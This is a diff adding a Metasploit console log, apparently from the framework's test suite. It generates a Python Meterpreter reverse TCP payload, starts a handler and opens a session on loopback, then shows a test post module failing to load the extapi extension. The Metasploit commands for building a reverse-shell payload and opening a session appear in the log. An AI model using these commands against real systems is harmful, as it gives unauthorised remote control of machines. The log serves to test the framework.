@@ -1,0 +1,18 @@
+use python/meterpreter/reverse_tcp
+generate -o D:/a/_temp/meterpreter-spec-rb-python-meterpreter-reverse-tcp20220128-6448-f2jc7o.py -f raw MeterpreterTryToFork=false lport=6014 lhost=127.0.0.1
+msf6 payload(python/meterpreter/reverse_tcp) > [*] Writing 493 bytes to D:/a/_temp/meterpreter-spec-rb-python-meterpreter-reverse-tcp20220128-6448-f2jc7o.py...
+msf6 payload(python/meterpreter/reverse_tcp) > to_handler
+[*] Payload Handler Started as Job 13
+msf6 payload(python/meterpreter/reverse_tcp) > 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6014 
+[*] Sending stage (39804 bytes) to 127.0.0.1
+[*] Meterpreter session 14 opened (127.0.0.1:6014 -> 127.0.0.1:50066 ) at 2022-01-28 22:40:19 +0000
+use test/extapi
+msf6 post(test/extapi) > run session=14 addentropy=true verbose=true
+[*] Loading extapi extension...
+[-] Post failed: Rex::Post::Meterpreter::ExtensionLoadError The "extapi" extension is not supported by this Meterpreter type (python/windows)
+[-] Call stack:
+[-]   D:/a/metasploit-framework/metasploit-framework/test/modules/post/test/extapi.rb:32:in `setup'
+[*] Post module execution completed
+msf6 post(test/extapi) > 
